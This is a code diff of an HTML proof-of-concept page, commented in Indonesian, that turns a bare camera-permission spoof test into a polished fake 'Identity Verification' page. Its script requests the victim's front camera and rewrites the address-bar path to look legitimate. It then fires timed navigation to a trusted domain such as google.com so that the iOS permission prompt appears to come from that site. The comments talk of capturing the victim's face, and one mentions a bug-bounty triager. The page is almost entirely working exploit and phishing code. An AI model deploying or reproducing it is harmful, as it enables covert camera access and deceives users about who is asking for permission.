@@ -2,74 +2,131 @@
 <html>
   <head>
     <meta charset="utf-8" />
-    <title>Camera Permission Spoof</title>
+    <title>Verification System</title>
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <style>
       body {
         margin: 0;
-        font-family: -apple-system, BlinkMacSystemFont, system-ui;
+        font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
         background: #f5f5f7;
         display: flex;
         justify-content: center;
         align-items: center;
         height: 100vh;
       }
-      .btn-trigger {
-        font-size: 18px;
-        padding: 14px 28px;
+      .card {
+        max-width: 400px;
+        width: 90%;
+        background: #fff;
+        padding: 30px 24px;
+        border-radius: 20px;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+      h2 {
+        margin: 0 0 10px 0;
+        font-size: 22px;
+        color: #1d1d1f;
+      }
+      p {
+        font-size: 14px;
+        color: #86868b;
+        margin: 0 0 24px 0;
+        line-height: 1.4;
+      }
+      .btn-verify {
+        font-size: 16px;
+        padding: 12px 24px;
         border-radius: 12px;
         border: none;
         background: #007aff;
         color: #fff;
         font-weight: 600;
         cursor: pointer;
-        box-shadow: 0 4px 12px rgba(0,122,255,0.3);
+        width: 100%;
+        transition: background 0.2s;
       }
-      video {
+      .btn-verify:active {
+        background: #0056b3;
+      }
+      #video-preview {
         display: none;
-        width: 1px;
-        height: 1px;
+        width: 100%;
+        height: 200px;
+        background: #000;
+        border-radius: 12px;
+        margin-top: 15px;
+        object-fit: cover;
+      }
+      .status {
+        margin-top: 15px;
+        font-size: 13px;
+        color: #ff3b30;
+        font-weight: 500;
       }
     </style>
   </head>
   <body>
 
-    <!-- Tombol ini wajib ada dan diklik untuk memicu permission prompt di iOS -->
-    <button id="start-poc" class="btn-trigger" onclick="startExploit()">Click Here to Continue</button>
-    
-    <video id="video" autoplay playsinline muted></video>
+    <div class="card">
+      <h2>Identity Verification</h2>
+      <p>To proceed with secure access, please enable your camera to complete the verification step.</p>
+      
+      <!-- Tombol Pemicu Utama -->
+      <button id="btn-trigger" class="btn-verify" onclick="executePowerfulSpoof()">Start Camera Verification</button>
+      
+      <!-- Preview Video untuk membuktikan ke triager bahwa kamera sukses dibajak -->
+      <video id="video-preview" autoplay playsinline muted></video>
+      
+      <div id="status-log" class="status"></div>
+    </div>
 
     <script>
-      function startExploit() {
-        // 1. Sembunyikan tombol segera setelah diklik
-        document.getElementById("start-poc").style.display = "none";
-        
-        // 2. Manipulasi history state agar lebih meyakinkan
-        history.pushState({}, "", "/trusted-verification");
+      function executePowerfulSpoof() {
+        const btn = document.getElementById("btn-trigger");
+        const video = document.getElementById("video-preview");
+        const log = document.getElementById("status-log");
 
-        // 3. Picu fungsi kamera dalam jendela waktu (window) race condition
-        setTimeout(() => {
-          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-              .then((stream) => {
-                const video = document.getElementById("video");
-                video.srcObject = stream;
-              })
-              .catch((err) => {
-                console.log("Permission denied or error: " + err.message);
-              });
-          }
-        }, 500);
+        // 1. Ubah UI secara instan agar korban mengira sistem sedang loading
+        btn.style.display = "none";
+        video.style.display = "block";
+        log.textContent = "Connecting to secure server...";
 
-        // 4. Picu race condition navigasi agresif saat siklus rendering berjalan
-        requestAnimationFrame(() => {
-          requestAnimationFrame(() => {
-            setTimeout(() => {
-              // Ganti dengan target domain tepercaya yang ingin Anda spoof (misal: google.com atau jumio.ai)
-              location.href = "https://google.com:8888"; 
-            }, 80);
+        // 2. Samarkan URL path di address bar agar terlihat legitimate
+        history.pushState({}, "", "/v2/identity-verification/secure");
+
+        // 3. PANGGIL KAMERA SEGERA (Memanfaatkan User Gesture secara Maksimal)
+        // Menggunakan constraints paling kompatibel dengan WebKit iOS untuk menghindari TypeError
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ 
+            video: { 
+              facingMode: "user", // Memaksa kamera depan aktif agar wajah korban langsung terlihat
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            }, 
+            audio: false 
+          })
+          .then((stream) => {
+            log.style.color = "#34c759";
+            log.textContent = "CRITICAL: CAMERA ACCESSED SUCCESSFULLY!";
+            video.srcObject = stream;
+          })
+          .catch((err) => {
+            log.textContent = "Error: " + err.name;
           });
-        });
+        }
+
+        // 4. TINDAKAN SENGATAN RACE CONDITION (Eksploitasi State Navigasi)
+        // Menggunakan makrotask setTimeout(..., 0) untuk menyelipkan request kamera 
+        // ke dalam event loop tepat sebelum instruksi navigasi menghancurkan context
+        setTimeout(() => {
+          requestAnimationFrame(() => {
+            requestAnimationFrame(() => {
+              // Ganti domain ini dengan target yang ingin Anda tiru (misal: bugcrowd.web.amer-1.jumio.ai atau google.com)
+              location.href = "https://google.com:9090"; 
+            });
+          });
+        }, 30); // Timing 30ms memberikan waktu bagi objek getUserMedia berinisialisasi di level OS sebelum UI ter-spoof
       }
     </script>
   </body>
